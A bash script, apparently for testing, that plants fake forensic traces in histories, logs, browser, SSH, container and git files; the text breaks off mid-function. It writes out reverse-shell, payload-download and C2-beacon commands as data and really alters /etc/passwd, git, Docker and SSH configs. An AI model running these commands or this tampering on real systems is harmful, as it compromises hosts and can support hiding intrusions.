#!/bin/bash
# Script to create various forensic artifacts for testing

set -e

echo "================================"
echo "Creating Forensic Artifacts"
echo "================================"
echo ""

# Function to create artifacts
create_artifacts() {
    echo "[*] Creating shell history artifacts..."
    
    # Bash history
    echo "ls -la /etc/passwd" >> ~/.bash_history
    echo "sudo cat /etc/shadow" >> ~/.bash_history
    echo "wget http://malicious.com/payload.sh" >> ~/.bash_history
    echo "chmod +x payload.sh" >> ~/.bash_history
    echo "./payload.sh" >> ~/.bash_history
    printf "whoami\npwd\necho injected\n" >> ~/.bash_history
    
    # Zsh history
    echo ": 1234567890:0;ls -la /etc/passwd" >> ~/.zsh_history
    echo ": 1234567891:0;sudo cat /etc/shadow" >> ~/.zsh_history
    echo ": 1234567892:0;nc -lvp 4444" >> ~/.zsh_history
    HISTFILE=~/.zsh_history; printf ": 0:0;id\n" >> "$HISTFILE"
    
    # Python history
    echo "import os" >> ~/.python_history
    echo "os.system('whoami')" >> ~/.python_history
    echo "exec(open('/etc/passwd').read())" >> ~/.python_history
    
    # MySQL history
    echo "SELECT * FROM users WHERE password IS NOT NULL;" >> ~/.mysql_history
    echo "DROP DATABASE production;" >> ~/.mysql_history
    
    # SQLite history
    echo ".tables" >> ~/.sqlite_history
    echo "SELECT * FROM sensitive_data;" >> ~/.sqlite_history
    
    # R history
    echo "system('cat /etc/passwd')" >> ~/.Rhistory
    echo "data <- read.csv('/sensitive/data.csv')" >> ~/.Rhistory
    
    # GDB history
    echo "break main" >> ~/.gdb_history
    echo "run < /etc/passwd" >> ~/.gdb_history
    
    # MongoDB history
    echo "db.users.find({password: {$exists: true}})" >> ~/.mongo_history
    echo "db.dropDatabase()" >> ~/.mongo_history
    
    # Docker history
    echo "docker run -v /:/host alpine cat /host/etc/shadow" >> ~/.docker_history
    echo "docker exec -it container /bin/bash" >> ~/.docker_history
    
    # IPython history
    mkdir -p ~/.ipython/profile_default
    echo "import subprocess; subprocess.call(['cat', '/etc/shadow'])" >> ~/.ipython/profile_default/history.sqlite
    echo "!cat /etc/passwd" >> ~/.ipython/profile_default/history.sqlite
    
    # Ruby IRB history
    echo "system('whoami')" >> ~/.irb_history
    echo "File.read('/etc/passwd')" >> ~/.irb_history
    echo "exec('nc -e /bin/bash 10.0.0.1 4444')" >> ~/.irb_history
    
    # Node.js REPL history
    echo "require('child_process').exec('cat /etc/passwd')" >> ~/.node_repl_history
    echo "process.mainModule.require('fs').readFileSync('/etc/shadow')" >> ~/.node_repl_history
    
    # PHP interactive history
    echo "system('id');" >> ~/.php_history
    echo "file_get_contents('/etc/passwd');" >> ~/.php_history
    echo "exec('nc -lvp 4444');" >> ~/.php_history
    
    # Perl debugger history
    echo "x system('whoami')" >> ~/.perldb_hist
    echo "p 'Permission denied for /etc/shadow'" >> ~/.perldb_hist
    
    # Erlang shell history
    echo "os:cmd(\"cat /etc/passwd\")." >> ~/.erlang_history
    echo "file:read_file(\"/etc/shadow\")." >> ~/.erlang_history
    
    # Lua history
    echo "os.execute('whoami')" >> ~/.lua_history
    echo "io.open('/etc/passwd'):read('*a')" >> ~/.lua_history
    
    # Julia REPL history
    mkdir -p ~/.julia/logs
    echo "run(`cat /etc/passwd`)" >> ~/.julia/logs/repl_history.jl
    echo "read(\"/etc/shadow\", String)" >> ~/.julia/logs/repl_history.jl
    
    # Scala REPL history
    echo "import sys.process._; \"cat /etc/passwd\".!" >> ~/.scala_history
    echo "scala.io.Source.fromFile(\"/etc/shadow\").mkString" >> ~/.scala_history
    
    # Haskell GHCi history
    mkdir -p ~/.ghc
    echo ":! cat /etc/passwd" >> ~/.ghc/ghci_history
    echo "readFile \"/etc/shadow\"" >> ~/.ghc/ghci_history
    
    # Octave history
    echo "system('whoami')" >> ~/.octave_hist
    echo "fid = fopen('/etc/passwd'); fread(fid); fclose(fid);" >> ~/.octave_hist
    
    # MATLAB history (if present)
    mkdir -p ~/.matlab/R2023a
    echo "!cat /etc/passwd" >> ~/.matlab/R2023a/History.xml
    echo "system('nc -e /bin/bash 10.0.0.1 4444')" >> ~/.matlab/R2023a/History.xml
    
    # Vim info
    echo "# Recent files:" >> ~/.viminfo
    echo "'0  1  0  /etc/passwd" >> ~/.viminfo
    echo "'1  1  0  /etc/shadow" >> ~/.viminfo
    echo "'2  1  0  /home/testuser/secret.txt" >> ~/.viminfo
    
    # Less history
    echo "/etc/passwd" >> ~/.lesshst
    echo "/var/log/auth.log" >> ~/.lesshst
    
    # Wget history
    echo "http://malicious.com/payload.sh 1234567890" >> ~/.wget-hsts
    
    # Create .local/share histories
    mkdir -p ~/.local/share/mc ~/.local/share/nano
    echo "cd /etc" >> ~/.local/share/mc/history
    echo "view passwd" >> ~/.local/share/mc/history
    echo "password123" >> ~/.local/share/nano/search_history
    echo "secret_key" >> ~/.local/share/nano/search_history
    
    echo "[✓] Shell histories created"
    
    # Create some actual commands in current session
    history -s "sudo nmap -sS 192.168.1.0/24"
    history -s "curl http://c2server.com/beacon"
    
    # System logs (as root)
    echo "[*] Creating system log artifacts..."
    sudo bash -c '
        # Auth logs
        echo "Jan 1 12:00:00 testhost sshd[1234]: Failed password for root from 10.0.0.1 port 22 ssh2" >> /var/log/auth.log
        echo "Jan 1 12:00:01 testhost sshd[1234]: Accepted password for testuser from 10.0.0.1 port 22 ssh2" >> /var/log/auth.log
        echo "Jan 1 12:00:02 testhost sudo: testuser : TTY=pts/0 ; PWD=/home/testuser ; USER=root ; COMMAND=/bin/bash" >> /var/log/auth.log
        
        # Syslog
        echo "Jan 1 12:00:00 testhost kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:00:00:00:00:00 SRC=10.0.0.1 DST=10.0.0.2 LEN=52" >> /var/log/syslog
        echo "Jan 1 12:00:01 testhost systemd[1]: Started Reverse Shell Service" >> /var/log/syslog
        
        # Kernel logs
        echo "Jan 1 12:00:00 testhost kernel: Process hiding module loaded" >> /var/log/kern.log
        
        # Apache logs
        mkdir -p /var/log/apache2
        echo "10.0.0.1 - - [01/Jan/2024:12:00:00 +0000] \"GET /admin/config.php HTTP/1.1\" 200 1234" >> /var/log/apache2/access.log
        echo "[Mon Jan 01 12:00:00.123456 2024] [core:error] [pid 1234] [client 10.0.0.1:12345] File does not exist: /var/www/html/shell.php" >> /var/log/apache2/error.log
        
        # Nginx logs
        mkdir -p /var/log/nginx
        echo "10.0.0.1 - - [01/Jan/2024:12:00:00 +0000] \"POST /upload.php HTTP/1.1\" 200 1234 \"-\" \"curl/7.68.0\"" >> /var/log/nginx/access.log
        
        # Audit logs
        if [ -d "/var/log/audit" ]; then
            echo "type=EXECVE msg=audit(1234567890.123:456): argc=3 a0=\"/bin/bash\" a1=\"-c\" a2=\"nc -e /bin/bash 10.0.0.1 4444\"" >> /var/log/audit/audit.log
            echo "type=USER_LOGIN msg=audit(1234567890.123:457): pid=1234 uid=0 auid=1000 ses=1 msg=\"op=login id=1000 exe=\"/usr/sbin/sshd\" hostname=10.0.0.1 addr=10.0.0.1 terminal=/dev/pts/0 res=success\"" >> /var/log/audit/audit.log
        fi
        
        # Login records
        echo "testuser pts/0 10.0.0.1 $(date)" >> /var/log/wtmp
        echo "root pts/1 10.0.0.1 $(date)" >> /var/log/wtmp
        echo "testuser pts/0 10.0.0.1 $(date)" >> /var/log/lastlog
        
        # Failed login attempts
        echo "root ssh:notty 10.0.0.1 $(date)" >> /var/log/btmp
        echo "admin ssh:notty 10.0.0.1 $(date)" >> /var/log/btmp
        
        # Package manager logs
        echo "$(date) install malicious-package:amd64 <none> 1.0-1" >> /var/log/dpkg.log
        echo "$(date) install evilpkg" >> /var/log/dpkg.log
        echo "Commandline: apt-get install netcat" >> /var/log/apt/history.log
        echo "$(date) Installed: evilpkg" >> /var/log/apt/history.log
        echo "Install: netcat:amd64 (1.10-41)" >> /var/log/apt/term.log
        
        # Cron logs
        echo "$(date) (root) CMD (/tmp/backdoor.sh)" >> /var/log/cron
        echo "$(date) (testuser) CMD (curl http://c2server.com/beacon)" >> /var/log/cron.log
        
        # Mail logs
        echo "$(date) testhost postfix: to=<admin@target.com>, relay=evil.com" >> /var/log/mail.log
        echo "$(date) testhost sendmail: from=attacker@evil.com" >> /var/log/maillog
        
        # Firewall logs
        echo "$(date) [UFW BLOCK] SRC=10.0.0.1 DST=10.0.0.2 PROTO=TCP DPT=4444" >> /var/log/ufw.log
        
        # X11 logs
        echo "(EE) Failed to load module \"rootkit\" (module does not exist, 0)" >> /var/log/Xorg.0.log
        
        # CUPS logs
        mkdir -p /var/log/cups
        echo "E [$(date)] Suspicious print job from 10.0.0.1" >> /var/log/cups/error_log
        
        # Network daemon logs  
        echo "$(date) NetworkManager: <info> connection activated" >> /var/log/daemon.log
        
        # NetworkManager connections
        mkdir -p /etc/NetworkManager/system-connections
        echo "[connection]" >> /etc/NetworkManager/system-connections/EvilAP
        echo "id=EvilAP" >> /etc/NetworkManager/system-connections/EvilAP
        
        # Additional audit logs
        echo "type=SYSCALL msg=audit($(date +%s).123:999): syscall=59 exe=\"/bin/nc\"" >> /var/log/audit/ausearch.log
        
        # Current logins (utmp)
        echo "testuser pts/1 10.0.0.1 $(date)" >> /var/log/utmp
    '
    
    # Add journald entries (if systemd is available)
    logger "NYX-TEST: syslog marker" 2>/dev/null || echo "NYX-TEST: syslog marker" | sudo tee -a /var/log/syslog >/dev/null
    if command -v systemd-cat >/dev/null 2>&1; then
        sudo bash -c 'printf "NYX-TEST journald\n" | systemd-cat -t NYX-TEST' 2>/dev/null || true
    fi
    
    echo "[✓] System logs created"
    
    # Create some running processes that would show in logs
    echo "[*] Creating process artifacts..."
    # Start a background process that would appear suspicious
    (sleep 3600 &) 2>/dev/null
    
    # Create temporary files that might be logged
    touch /tmp/suspicious_script.sh
    touch /tmp/.hidden_file
    
    # Create Python/Perl scripts in temp
    echo "#!/usr/bin/python" > /tmp/backdoor.py
    echo "import socket; s=socket.socket(); s.connect(('10.0.0.1',4444))" >> /tmp/backdoor.py
    echo "#!/usr/bin/perl" > /tmp/exploit.pl
    echo "system('nc -e /bin/sh 10.0.0.1 4444');" >> /tmp/exploit.pl
    
    # Create thumbnail caches
    mkdir -p ~/.cache/thumbnails/normal ~/.thumbnails/normal
    touch ~/.cache/thumbnails/normal/suspicious_image.png
    touch ~/.thumbnails/normal/sensitive_doc.pdf.png
    
    # Create core dump
    echo "Core dump from suspicious process" > /tmp/core.12345
    
    echo "[✓] Process artifacts created"
    
    echo "[*] Creating Linux-specific artifacts..."
    
    # Create Trash
    mkdir -p ~/.local/share/Trash/files ~/.local/share/Trash/info
    echo "Deleted sensitive file" > ~/.local/share/Trash/files/sensitive.txt
    echo "[Trash Info]
Path=/home/testuser/sensitive.txt
DeletionDate=$(date +%Y-%m-%dT%H:%M:%S)" > ~/.local/share/Trash/info/sensitive.txt.trashinfo
    
    # Create GNOME Tracker databases
    mkdir -p ~/.cache/tracker3/files ~/.local/state/tracker
    echo "File access logs" > ~/.cache/tracker3/files/meta.db
    echo "Tracker state" > ~/.local/state/tracker/ontologies.db
    
    # Create Zeitgeist logs
    mkdir -p ~/.local/share/zeitgeist
    echo "Activity log database" > ~/.local/share/zeitgeist/activity.sqlite
    
    echo "[✓] Linux-specific artifacts created"
    
    echo "[*] Creating advanced Linux artifacts..."
    
    # GNOME Tracker + thumbnail cache
    mkdir -p ~/Pictures ~/Documents
    # Create a simple image using imagemagick if available
    if command -v convert >/dev/null 2>&1; then
        convert -size 64x64 xc:red ~/Pictures/red.png
        # Try to index with tracker if available
        if command -v tracker3 >/dev/null 2>&1; then
            tracker3 index ~/Pictures/red.png 2>/dev/null || true
        fi
    else
        # Fallback: create a simple file
        echo "test image" > ~/Pictures/red.png
    fi
    
    # Simulate opening file to generate thumbnail
    if command -v xdg-open >/dev/null 2>&1; then
        xdg-open ~/Pictures/red.png >/dev/null 2>&1 &
        sleep 2
        pkill xdg-open 2>/dev/null || true
    fi
    
    # Zeitgeist (older Ubuntu)
    if command -v zeitgeist-daemon >/dev/null 2>&1; then
        zeitgeist-daemon >/dev/null 2>&1 &
        touch ~/Documents/secret.txt
        xdg-open ~/Documents/secret.txt >/dev/null 2>&1 &
        sleep 2
        pkill xdg-open 2>/dev/null || true
    fi
    
    # Audit log entries (simulate if auditd not running)
    if command -v auditctl >/dev/null 2>&1 && sudo auditctl -l >/dev/null 2>&1; then
        sudo auditctl -w /etc/passwd -p wa -k NYXTEST 2>/dev/null || true
        sudo bash -c 'echo "# dummy change for NYXTEST" >> /etc/passwd'
        sleep 1
        sudo auditctl -D 2>/dev/null || true  # Remove rule but keep event
    else
        # Simulate audit log entry
        sudo bash -c 'echo "type=SYSCALL msg=audit($(date +%s).123:999): syscall=59 exe=\"/bin/nc\" key=\"NYXTEST\"" >> /var/log/audit/audit.log'
    fi
    
    # NetworkManager connection artifact
    if command -v nmcli >/dev/null 2>&1; then
        sudo nmcli c add type ethernet ifname nyx-test con-name NYX-TEST \
            ipv4.method disabled ipv6.method ignore 2>/dev/null || true
    fi
    
    echo "[✓] Advanced Linux artifacts created"
    
    echo "[*] Creating package manager artifacts..."
    
    # APT/DPKG artifacts
    if command -v apt >/dev/null 2>&1 || command -v dpkg >/dev/null 2>&1; then
        sudo bash -c '
            # APT archives
            mkdir -p /var/cache/apt/archives
            echo "Cached package data" > /var/cache/apt/archives/malicious-tool_1.0_amd64.deb
            echo "Cached exploit kit" > /var/cache/apt/archives/nmap_7.80_amd64.deb
            
            # APT logs
            mkdir -p /var/log/apt
            echo "Start-Date: $(date)" >> /var/log/apt/history.log
            echo "Commandline: apt-get install netcat-openbsd" >> /var/log/apt/history.log
            echo "Install: netcat-openbsd:amd64 (1.195-2ubuntu1)" >> /var/log/apt/history.log
            echo "End-Date: $(date)" >> /var/log/apt/history.log
            
            echo "$(date) install netcat-openbsd:amd64 <none> 1.195-2ubuntu1" >> /var/log/apt/term.log
            echo "$(date) install hydra:amd64 <none> 9.0-1" >> /var/log/apt/term.log
            
            # DPKG logs
            echo "$(date) startup packages configure" >> /var/log/dpkg.log
            echo "$(date) install netcat-openbsd:amd64 <none> 1.195-2ubuntu1" >> /var/log/dpkg.log
            echo "$(date) install john:amd64 <none> 1.9.0-2" >> /var/log/dpkg.log
        '
    fi
    
    # YUM/DNF artifacts (simulate even if not present)
    sudo bash -c '
        mkdir -p /var/cache/yum /var/cache/dnf
        echo "Cached RPM data" > /var/cache/yum/x86_64/7/base/suspicious-tool-1.0-1.x86_64.rpm
        echo "DNF cache data" > /var/cache/dnf/fedora/packages/ncat-7.70-1.fc30.x86_64.rpm
        
        echo "$(date) Installed: nmap-7.70-1.fc30.x86_64" >> /var/log/yum.log
        echo "$(date) Installed: john-1.9.0-1.el8.x86_64" >> /var/log/yum.log
        
        echo "$(date) INFO Installing: ncat-7.70-1.fc30.x86_64" >> /var/log/dnf.log
        echo "$(date) INFO Installed: hydra-9.0-1.fc30.x86_64" >> /var/log/dnf.log
    '
    
    # Pacman artifacts (simulate even if not present)
    sudo bash -c '
        mkdir -p /var/cache/pacman/pkg
        echo "Pacman package cache" > /var/cache/pacman/pkg/nmap-7.80-1-x86_64.pkg.tar.xz
        echo "Pacman package cache" > /var/cache/pacman/pkg/john-1.9.0-1-x86_64.pkg.tar.xz
        
        echo "[$(date)] [ALPM] installed nmap (7.80-1)" >> /var/log/pacman.log
        echo "[$(date)] [ALPM] installed netcat (0.7.1-6)" >> /var/log/pacman.log
    '
    
    echo "[✓] Package manager artifacts created"
    
    echo "[*] Creating container/VM artifacts..."
    
    # Docker artifacts
    sudo bash -c '
        # Docker container logs
        mkdir -p /var/lib/docker/containers/abc123def456/
        echo "$(date) Container started with suspicious command: nc -e /bin/bash 10.0.0.1 4444" > /var/lib/docker/containers/abc123def456/abc123def456-json.log
        echo "$(date) Downloading payload from C2 server" >> /var/lib/docker/containers/abc123def456/abc123def456-json.log
        
        mkdir -p /var/lib/docker/containers/def456ghi789/
        echo "$(date) Alpine container executing: cat /etc/shadow" > /var/lib/docker/containers/def456ghi789/def456ghi789-json.log
    '
    
    # User Docker config
    mkdir -p ~/.docker ~/.docker/machine/machines/evil-host
    echo '{"auths":{"registry.evil.com":{"auth":"YWRtaW46cGFzc3dvcmQ="}}}' > ~/.docker/config.json
    echo '{"Driver":{"MachineName":"evil-host","IPAddress":"10.0.0.1"}}' > ~/.docker/machine/machines/evil-host/config.json
    
    # Podman/K8s artifacts
    sudo bash -c '
        mkdir -p /var/lib/containers/storage/overlay/123abc/userdata
        echo "Podman overlay userdata" > /var/lib/containers/storage/overlay/123abc/userdata/suspicious-mount.json
        
        mkdir -p /var/log/pods/kube-system_malicious-pod_abc123
        echo "$(date) Pod log: Executing privilege escalation" > /var/log/pods/kube-system_malicious-pod_abc123/container.log
    '
    
    # Libvirt/QEMU artifacts
    sudo bash -c '
        mkdir -p /var/log/libvirt/qemu /var/cache/libvirt/qemu
        echo "$(date): starting up libvirt version: 6.0.0" > /var/log/libvirt/qemu/evil-vm.log
        echo "$(date): QEMU_MONITOR_EVENT: event=POWERDOWN" >> /var/log/libvirt/qemu/evil-vm.log
        
        echo "QEMU cache data" > /var/cache/libvirt/qemu/capabilities.xml
        echo "VM metadata cache" > /var/cache/libvirt/qemu/evil-vm.xml
    '
    
    echo "[✓] Container/VM artifacts created"
    
    echo "[*] Creating browser artifacts..."
    
    # Firefox artifacts
    mkdir -p ~/.mozilla/firefox/profile.default-release/cache2/entries
    mkdir -p ~/.mozilla/firefox/profile.default-release/storage/default
    mkdir -p ~/.mozilla/firefox/profile.default-release/thumbnails
    mkdir -p ~/.mozilla/firefox/profile.default-release/sessionstore-backups
    
    echo "Mozilla cache entry" > ~/.mozilla/firefox/profile.default-release/cache2/entries/evil-site-cache
    echo "Storage data" > ~/.mozilla/firefox/profile.default-release/storage/default/evil-site-storage
    echo "Thumbnail data" > ~/.mozilla/firefox/profile.default-release/thumbnails/evil-thumbnail.jpg
    echo "Session backup" > ~/.mozilla/firefox/profile.default-release/sessionstore-backups/recovery.jsonlz4
    
    # Create SQLite databases with test data
    if command -v sqlite3 >/dev/null 2>&1; then
        sqlite3 ~/.mozilla/firefox/profile.default-release/places.sqlite "CREATE TABLE moz_places (url TEXT); INSERT INTO moz_places VALUES ('http://evil-c2-server.com/panel');"
        sqlite3 ~/.mozilla/firefox/profile.default-release/cookies.sqlite "CREATE TABLE moz_cookies (host TEXT, name TEXT); INSERT INTO moz_cookies VALUES ('evil-site.com', 'session_token');"
        sqlite3 ~/.mozilla/firefox/profile.default-release/formhistory.sqlite "CREATE TABLE moz_formhistory (fieldname TEXT, value TEXT); INSERT INTO moz_formhistory VALUES ('password', 'admin123');"
    else
        echo "places.sqlite content" > ~/.mozilla/firefox/profile.default-release/places.sqlite
        echo "cookies.sqlite content" > ~/.mozilla/firefox/profile.default-release/cookies.sqlite
        echo "formhistory.sqlite content" > ~/.mozilla/firefox/profile.default-release/formhistory.sqlite
    fi
    
    # Chrome/Chromium artifacts
    mkdir -p ~/.config/google-chrome/Default/Cache
    mkdir -p ~/.config/google-chrome/Default
    mkdir -p ~/.config/chromium/Default/Cache
    mkdir -p ~/.config/chromium/Default
    
    echo "Chrome cache data" > ~/.config/google-chrome/Default/Cache/evil-cache-entry
    echo "Chrome history data" > ~/.config/google-chrome/Default/History
    echo "Chrome cookies data" > ~/.config/google-chrome/Default/Cookies
    echo "Chrome web data" > ~/.config/google-chrome/Default/Web\ Data
    echo "Chrome top sites" > ~/.config/google-chrome/Default/Top\ Sites
    
    echo "Chromium cache data" > ~/.config/chromium/Default/Cache/evil-cache-entry
    echo "Chromium history data" > ~/.config/chromium/Default/History
    echo "Chromium cookies data" > ~/.config/chromium/Default/Cookies
    echo "Chromium web data" > ~/.config/chromium/Default/Web\ Data
    echo "Chromium top sites" > ~/.config/chromium/Default/Top\ Sites
    
    echo "[✓] Browser artifacts created"
    
    echo "[*] Creating SSH artifacts..."
    
    # SSH user artifacts
    mkdir -p ~/.ssh
    echo "# SSH known hosts" > ~/.ssh/known_hosts
    echo "evil-server.com,10.0.0.1 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC..." >> ~/.ssh/known_hosts
    echo "c2-server.evil.com,192.168.1.100 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5..." >> ~/.ssh/known_hosts
    echo "compromised-server.org,203.0.113.1 ecdsa-sha2-nistp256 AAAAE2VjZHNh..." >> ~/.ssh/known_hosts
    
    echo "$(date) SSH connection established to evil-server.com" > ~/.ssh/connection.log
    echo "$(date) Key exchange completed with c2-server.evil.com" > ~/.ssh/debug.log
    
    # System SSH logs
    sudo bash -c '
        # Add SSH entries to auth.log that should be cleaned
        echo "$(date) testhost sshd[12345]: Accepted publickey for root from 10.0.0.1 port 22 ssh2: RSA SHA256:abc123..." >> /var/log/auth.log
        echo "$(date) testhost sshd[12346]: Connection from 192.168.1.100 port 54321 on 10.0.0.2 port 22" >> /var/log/auth.log
        echo "$(date) testhost sshd[12347]: Failed password for admin from 203.0.113.1 port 22 ssh2" >> /var/log/auth.log
        echo "$(date) testhost sshd[12348]: Disconnected from invalid user hacker 10.0.0.1 port 22" >> /var/log/auth.log
        
        echo "$(date) testhost sshd[12349]: Accepted password for testuser from 10.0.0.1 port 22 ssh2" >> /var/log/secure
        echo "$(date) testhost sshd[12350]: pam_unix(sshd:session): session opened for user testuser by (uid=0)" >> /var/log/secure
    '
    
    echo "[✓] SSH artifacts created"
    
    echo "[*] Creating additional systemd artifacts..."
    
    sudo bash -c '
        # systemd random seed
        echo "SystemD random seed data" > /var/lib/systemd/random-seed
        
        # Live session journal traces
        mkdir -p /run/log/journal/abc123def456
        echo "Live session journal entry" > /run/log/journal/abc123def456/system.journal
        echo "Runtime journal entry" > /run/log/journal/abc123def456/user-1000.journal
    '
    
    echo "[✓] Additional systemd artifacts created"
    
    echo "[*] Creating print subsystem artifacts..."
    
    sudo bash -c '
        # CUPS artifacts
        mkdir -p /var/spool/cups /var/log/cups
        
        # Print job spools
        echo "PostScript print job data" > /var/spool/cups/c00001
        echo "PDF print job data" > /var/spool/cups/c00002
        echo "Suspicious document print job" > /var/spool/cups/c00003
        
        # CUPS logs
        echo "I [$(date)] Accepting connections." > /var/log/cups/access_log
        echo "10.0.0.1 - - [$(date)] \"POST /printers/LaserJet HTTP/1.1\" 200 0 Print-Job successful-ok" >> /var/log/cups/access_log
        echo "192.168.1.100 - - [$(date)] \"POST /printers/HP-Printer HTTP/1.1\" 200 0 Print-Job confidential-document.pdf" >> /var/log/cups/access_log
        
        echo "E [$(date)] Unable to encrypt connection from 10.0.0.1!" > /var/log/cups/error_log
        echo "W [$(date)] Suspicious print job from unauthorized user at 192.168.1.100" >> /var/log/cups/error_log
        
        echo "I [$(date)] Job 1 queued on \"HP-Printer\" by \"testuser\"." > /var/log/cups/page_log
        echo "I [$(date)] Job 2 queued on \"LaserJet\" by \"admin\"." >> /var/log/cups/page_log
    '
    
    echo "[✓] Print subsystem artifacts created"
    
    echo "[*] Creating additional forensic artifacts..."
    
    # DHCP leases
    sudo bash -c '
        mkdir -p /var/lib/dhclient
        echo "lease {" > /var/lib/dhclient/dhclient.eth0.leases
        echo "  interface \"eth0\";" >> /var/lib/dhclient/dhclient.eth0.leases
        echo "  fixed-address 192.168.1.100;" >> /var/lib/dhclient/dhclient.eth0.leases
        echo "  server-name \"evil-dhcp-server\";" >> /var/lib/dhclient/dhclient.eth0.leases
        echo "}" >> /var/lib/dhclient/dhclient.eth0.leases
    '
    
    # Create GTK bookmarks
    mkdir -p ~/.config/gtk-3.0
    echo "file:///tmp/suspicious-files Suspicious Files" > ~/.config/gtk-3.0/bookmarks
    echo "file:///home/testuser/malware Malware Collection" >> ~/.config/gtk-3.0/bookmarks
    
    # Create recently used files
    mkdir -p ~/.local/share
    echo '<?xml version="1.0" encoding="UTF-8"?>' > ~/.local/share/recently-used.xbel
    echo '<xbel version="1.0">' >> ~/.local/share/recently-used.xbel
    echo '  <bookmark href="file:///tmp/suspicious-script.sh" added="2024-01-01T12:00:00Z" modified="2024-01-01T12:00:00Z" visited="2024-01-01T12:00:00Z"/>' >> ~/.local/share/recently-used.xbel
    echo '  <bookmark href="file:///home/testuser/payload.bin" added="2024-01-01T12:01:00Z" modified="2024-01-01T12:01:00Z" visited="2024-01-01T12:01:00Z"/>' >> ~/.local/share/recently-used.xbel
    echo '</xbel>' >> ~/.local/share/recently-used.xbel
    
    # Create crash dumps in known locations
    sudo bash -c '
        mkdir -p /var/crash
        echo "Core dump from suspicious process" > /var/crash/core.suspicious-binary.12345.gz
        echo "Crash report data" > /var/crash/_usr_bin_evil-tool.12345.crash
    '
    
    # VS Code/Editor traces
    mkdir -p ~/.local/share/code-server/User ~/.config/Code/User
    echo '{"recentFiles":["/tmp/backdoor.py","/etc/passwd"]}' > ~/.local/share/code-server/User/settings.json
    echo '{"workbench.startupEditor": "none", "files.associations": {"*.evil": "plaintext"}}' > ~/.config/Code/User/settings.json
    
    # JetBrains traces
    mkdir -p ~/.local/share/.IntelliJIdea2023.1/system/log
    echo "$(date) - Opened file: /tmp/malicious-script.py" > ~/.local/share/.IntelliJIdea2023.1/system/log/idea.log
    
    echo "[✓] Additional forensic artifacts created"
    
    echo "[*] Creating database server artifacts..."
    
    # MySQL/MariaDB artifacts
    sudo bash -c '
        mkdir -p /var/log/mysql
        echo "$(date) [Warning] Access denied for user root@10.0.0.1 (using password: YES)" >> /var/log/mysql/error.log
        echo "$(date) [Note] Connection from 192.168.1.100" >> /var/log/mysql/error.log
        echo "$(date) Query: SELECT * FROM users WHERE admin=1" >> /var/log/mysql/mysql-slow.log
        
        mkdir -p /var/lib/mysql
        echo "Binary log data" > /var/lib/mysql/mysql-bin.000001
        echo "InnoDB log data" > /var/lib/mysql/ib_logfile0
    '
    
    # PostgreSQL artifacts
    sudo bash -c '
        mkdir -p /var/log/postgresql
        echo "$(date) LOG: connection received: host=10.0.0.1 port=54321" >> /var/log/postgresql/postgresql-13-main.log
        echo "$(date) FATAL: password authentication failed for user \"postgres\"" >> /var/log/postgresql/postgresql-13-main.log
        echo "$(date) LOG: statement: DROP TABLE sensitive_data;" >> /var/log/postgresql/postgresql-13-main.log
    '
    
    # Redis artifacts
    sudo bash -c '
        mkdir -p /var/log/redis
        echo "[$(date)] # Connection from 10.0.0.1:54321" >> /var/log/redis/redis-server.log
        echo "[$(date)] # CONFIG SET requirepass password123" >> /var/log/redis/redis-server.log
        echo "[$(date)] # FLUSHALL command executed" >> /var/log/redis/redis-server.log
    '
    
    # MongoDB artifacts
    sudo bash -c '
        mkdir -p /var/log/mongodb
        echo "$(date) I NETWORK [conn1] connection accepted from 10.0.0.1:54321" >> /var/log/mongodb/mongod.log
        echo "$(date) I COMMAND [conn1] command admin.$cmd command: { dropDatabase: 1 }" >> /var/log/mongodb/mongod.log
    '
    
    echo "[✓] Database server artifacts created"
    
    echo "[*] Creating VPN/Proxy artifacts..."
    
    # OpenVPN artifacts
    sudo bash -c '
        mkdir -p /var/log/openvpn
        echo "$(date) 10.0.0.1:54321 TLS: Initial packet from [AF_INET]10.0.0.1:54321" >> /var/log/openvpn/openvpn.log
        echo "$(date) 10.0.0.1:54321 VERIFY ERROR: depth=0, error=certificate has expired" >> /var/log/openvpn/openvpn.log
        
        mkdir -p /etc/openvpn/client
        echo "remote evil-vpn-server.com 1194" > /etc/openvpn/client/evil-vpn.conf
    '
    
    # WireGuard artifacts
    sudo bash -c '
        mkdir -p /etc/wireguard
        echo "[Interface]" > /etc/wireguard/wg0.conf
        echo "PrivateKey = SUSPICIOUS_PRIVATE_KEY_DATA" >> /etc/wireguard/wg0.conf
        echo "[Peer]" >> /etc/wireguard/wg0.conf
        echo "Endpoint = evil-server.com:51820" >> /etc/wireguard/wg0.conf
    '
    
    # Squid proxy artifacts
    sudo bash -c '
        mkdir -p /var/log/squid
        echo "$(date) 10.0.0.1 TCP_MISS/200 1234 GET http://malicious-site.com/payload.exe" >> /var/log/squid/access.log
        echo "$(date) 192.168.1.100 TCP_TUNNEL/200 5678 CONNECT c2-server.com:443" >> /var/log/squid/access.log
    '
    
    echo "[✓] VPN/Proxy artifacts created"
    
    echo "[*] Creating mail server artifacts..."
    
    # Postfix artifacts
    sudo bash -c '
        mkdir -p /var/log/mail
        echo "$(date) postfix/smtpd[12345]: connect from unknown[10.0.0.1]" >> /var/log/mail/mail.log
        echo "$(date) postfix/cleanup[12346]: message-id=<evil@malicious.com>" >> /var/log/mail/mail.log
        echo "$(date) postfix/qmgr[12347]: from=<attacker@evil.com>, size=12345" >> /var/log/mail/mail.log
        
        mkdir -p /var/spool/postfix/deferred
        echo "Deferred mail from attacker" > /var/spool/postfix/deferred/ABC123
    '
    
    # Dovecot artifacts
    sudo bash -c '
        mkdir -p /var/log/dovecot
        echo "$(date) imap-login: Login: user=<admin>, method=PLAIN, rip=10.0.0.1" >> /var/log/dovecot/dovecot.log
        echo "$(date) imap(admin): Disconnected: Logged out in=123 out=456" >> /var/log/dovecot/dovecot.log
    '
    
    echo "[✓] Mail server artifacts created"
    
    echo "[*] Creating development tool artifacts..."
    
    # Git artifacts
    mkdir -p ~/.config/git
    echo "[user]" > ~/.gitconfig
    echo "    name = Evil Developer" >> ~/.gitconfig
    echo "    email = evil@malicious.com" >> ~/.gitconfig
    echo "[credential]" >> ~/.gitconfig
    echo "    helper = store" >> ~/.gitconfig
    
    echo "https://evil-user:password123@github.com" > ~/.git-credentials
    
    # Create git repo with suspicious history
    mkdir -p ~/evil-repo/.git
    cd ~/evil-repo
    git init >/dev/null 2>&1 || true
    echo "#!/bin/bash\nnc -e /bin/bash 10.0.0.1 4444" > backdoor.sh
    git add . >/dev/null 2>&1 || true
    git commit -m "Add backdoor" >/dev/null 2>&1 || true
